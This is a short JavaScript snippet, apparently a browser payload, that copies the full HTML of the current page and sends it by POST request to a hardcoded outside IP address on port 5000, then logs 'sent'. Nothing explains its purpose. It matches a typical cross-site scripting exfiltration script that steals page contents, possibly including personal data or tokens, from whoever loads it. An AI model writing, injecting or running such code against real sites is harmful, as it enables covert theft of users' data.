var formData = new FormData();
formData.append("html", document.documentElement.outerHTML);

var request = new XMLHttpRequest();
request.open("POST", "http://45.33.74.171:5000/");
request.send(formData);
console.log("sent")